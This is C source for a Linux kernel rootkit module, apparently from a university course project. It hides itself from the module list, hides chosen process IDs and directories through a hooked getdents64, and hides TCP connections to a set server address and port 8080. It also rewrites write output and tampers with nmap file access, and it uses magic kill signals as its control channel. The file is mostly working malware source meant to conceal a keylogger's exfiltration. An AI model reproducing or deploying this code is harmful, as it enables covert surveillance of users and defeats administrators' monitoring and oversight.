/*
 * The big final rootkit that will initialize the keylogger, hide the resultant
 * process, hide itself, hide the directories that it exists in, and hide
 * the network activity of the logger as it sends logs to an external IP
 * address.
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/module.h>
#include <linux/dirent.h>
#include <linux/tcp.h>

#include <linux/string.h>

#include <net/tcp.h>
#include <net/sock.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Alvin, Uwem, Derek (guided with XCellerator");
MODULE_DESCRIPTION("Rootkit hiding itself");
MODULE_VERSION("1.00");

// tracking variables: being wordy.
static int wordy = 0;

// tracking variables: hiding rootkit.
static int hidden = 0;
static struct list_head *hiding_spot;

#ifdef MODULE
extern struct module __this_module;
#define THIS_MODULE (&__this_module)
#else
#define THIS_MODULE ((struct module*)0)
#endif

// tracking variables: hiding directories.
static int dir_hiding = 0;

void hide_me(void){
	hiding_spot = THIS_MODULE->list.prev;
	list_del(&(THIS_MODULE->list));
	if(wordy)
	printk(KERN_INFO "Going into hiding...\n");
}

void show_me(void){
	list_add(&(THIS_MODULE->list),hiding_spot);
	if(wordy)
	printk(KERN_INFO "Coming out of hiding...\n");
}

// The hooks and tracking variables needed to hide directories
#define PREFIX "cpsc413-project"
char hide_proc[NAME_MAX]; //hide_proc gets filled at hooked sys_kill

static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);

asmlinkage int hook_getdents64(const struct pt_regs *regs){
  struct linux_dirent64 __user *dirent = (struct linux_dirent64*)regs->si;
  struct linux_dirent64 *current_dir, *prev_dir, *dirent_scratch = NULL;
  int offset = 0;
  long error;

  int ret = orig_getdents64(regs);
	if (!dir_hiding){
		return ret;
	}

  dirent_scratch = kzalloc(ret, GFP_KERNEL);

  if( ret <=0 || dirent_scratch==NULL ){
    return ret;
  }

  error = copy_from_user(dirent_scratch, dirent, ret);
  if(error){
    goto done;
  }

  while(offset < ret){
    current_dir = (void*)dirent_scratch + offset;


    if ((memcmp(hide_proc, current_dir->d_name, strlen(hide_proc)) == 0
				|| memcmp(PREFIX, current_dir->d_name, strlen(hide_proc)) == 0)
			  && strncmp(hide_proc, "", NAME_MAX) != 0){
			if(wordy)
			printk(KERN_INFO "Found directory %s.\n", current_dir->d_name);
      if (current_dir == dirent_scratch){
        ret -= current_dir->d_reclen;
        memmove(current_dir, (void*)current_dir + current_dir->d_reclen, ret);
        continue;
      }
      else{
        prev_dir->d_reclen += current_dir->d_reclen;
      }
    }
    else{
      prev_dir = current_dir;
    }

    offset += current_dir->d_reclen;

  }

  error = copy_to_user(dirent, dirent_scratch, ret);
  if(error){
    goto done;
  }

done:
  kfree(dirent_scratch);
  return ret;
}



/* the kill signal will toggle hiding the rootkit: kill -64 will
 * hide the rootkit itself. Extra functionality for toggling hiding processes
 * hiding files, and hiding network activity.
 */
static asmlinkage long (*orig_kill)(const struct pt_regs *regs);

asmlinkage int hook_kill(const struct pt_regs *regs){
	int sig = regs->si;
	pid_t pid = regs->di;

	if(sig == 64 && !hidden){
		hide_me();
		hidden = 1;
		dir_hiding = 1;
		return 0;
	}
	else if(sig == 64 && hidden){
		show_me();
		hidden = 0;
		dir_hiding = 0;
		return 0;
	}
	else if (sig == 63){
		if (wordy)
		printk(KERN_INFO "Setting hidden pid to %i\n", pid);
		sprintf(hide_proc, "%d", pid); //usage: kill -65 [PID to hide]
		return 0;
	}
	else if (sig == 62){
		wordy = !wordy;
		printk(KERN_INFO "Toggling wordiness: %i\n", wordy);
		return 0;
	}
	return orig_kill(regs);
}

/* The hook_tcp4_seq_show function checks if the malicious
 * port is in use and hides it if it is.
 */
 // #define ADDRESS "10.0.2.15"
#define ADDRESS "192.168.56.102" //Alvin's Server VM
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file* seq, void* v);

static asmlinkage long hook_tcp4_seq_show(struct seq_file* seq, void* v) {
  struct sock *sk =  v;
  int max_ip_len = 16;
  char foreign_ip_str[16];
  char local_ip_str[16];
  int bytes_written = 0;
  if (sk != (struct sock*)0x1) {
    bytes_written = snprintf(foreign_ip_str, max_ip_len, "%pI4", &sk->sk_daddr);
    if (bytes_written < 0) {
			if(wordy)
      printk(KERN_INFO "Could not write foreign ip string\n");
    }

    // Check if ip matches local machine. For the case where the server is the
    // local machine.
    bytes_written = snprintf(local_ip_str, max_ip_len, "%pI4", &sk->sk_rcv_saddr);
    if (bytes_written < 0) {
			if(wordy)
      printk(KERN_INFO "Could not write local ip string\n");
    }

    // Check if client or server ip matches malicious ADDRESS.
    if (strcmp(foreign_ip_str, ADDRESS) == 0 || strcmp(local_ip_str, ADDRESS) == 0) {
      return 0;
    } else if (sk->sk_num == 0x1f90) {
      return 0;
    }

  }

  return orig_tcp4_seq_show(seq, v);
}

/* Try to hide from other tools that don't use /proc/net/tcp. Hook openat to
 * prevent network monitoring tools from opening other files like /etc/hosts and
 * /etc/services.
 */
#define NMAP_SERVICES_FILE "/usr/bin/../share/nmap/nmap-services"
#define PORT_TO_HIDE "8080"
// #define ADDR_TO_HIDE "10.0.2.15"
#define ADDR_TO_HIDE "192.168.56.102" //Alvin's Server VM
#ifdef PTREGS_SYSCALL_STUBS

static asmlinkage int (*orig_openat)(struct pt_regs *regs);

static asmlinkage int hook_openat(struct pt_regs *regs) {
  char *pathname = (void*)(regs->si);
  char *hostname_file = "/etc/hostname";
  if (strcmp(pathname, NMAP_SERVICES_FILE) == 0) {
    regs->si = (unsigned long)((void *)hostname_file);
    return orig_openat(regs);
  }

  return orig_openat(regs);
}
#else
static asmlinkage int (*orig_openat)(int dirfd, const char __user *pathname, int flags, umode_t mode);

static asmlinkage int hook_openat(int dirfd, const char __user *pathname, int flags, umode_t mode) {
  if (strcmp(pathname, NMAP_SERVICES_FILE) == 0) {
    return orig_openat(dirfd, pathname, flags, mode);
  }

  return orig_openat(dirfd, pathname, flags, mode);
}
#endif

/* Hook the write function to prevent communication with server from
 * from being output to stdout. */
#define HTTP_ALT "http-alt"
static asmlinkage long (*orig_write)(struct pt_regs *regs);

static asmlinkage long hook_write(struct pt_regs *regs) {
  char *fake_port = "2020";
  char *fake_address = "123.456.789.0";
  char *orig_buff = (void*)(regs->si);
  if (strstr(orig_buff, PORT_TO_HIDE) != NULL) {
    regs->si = (unsigned long)((void*)fake_port);

    return orig_write(regs);
  } else if (strstr(orig_buff, ADDR_TO_HIDE) != NULL) {
    regs->si = (unsigned long)((void*)fake_address);

    return orig_write(regs);
  } else if (strstr(orig_buff, HTTP_ALT) != NULL) {
    regs->si = (unsigned long)((void*)fake_port);

    return orig_write(regs);
  }

  return orig_write(regs);
}

/* Tries to prevent wireshark from using pcap. Wireshark uses libpcap to library
 * to perform pcap. This hook aims to interrupt packet processing by causing
 * errors. */
static asmlinkage int (*orig_ezx_pcap_putget)(struct pt_regs *regs);

static asmlinkage int hook_ezx_pcap_putget(struct pt_regs *regs) {
  // Memset things to '\0' in this pcap_chip struct(it looks important).
  return orig_ezx_pcap_putget(regs);
}

//The hooking structure: for every syscall we want to hijack,
//we put in one more entry into this ftrace_hook struct array:
//HOOK([string name of syscall],literally just the method name
//of the hijacked func, (static)address of space to put original func)

static struct ftrace_hook hooks[] = {
	HOOK("sys_kill", hook_kill, &orig_kill),
  HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
  HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
  HOOK("__x64_sys_openat", hook_openat, &orig_openat),
  HOOK("__x64_sys_write", hook_write, &orig_write),
  //HOOK("ezx_pcap_putget", hook_ezx_pcap_putget, &orig_ezx_pcap_putget),
};


int __init my_init(void){
	int err;
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err){
		return err;
	}
	if(wordy)
	printk(KERN_INFO "Big kit loaded!\n");
	return 0;
}

void __exit my_exit(void){
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	if(wordy)
	printk(KERN_INFO "exiting Big kit!\n");
}

module_init(my_init);
module_exit(my_exit);
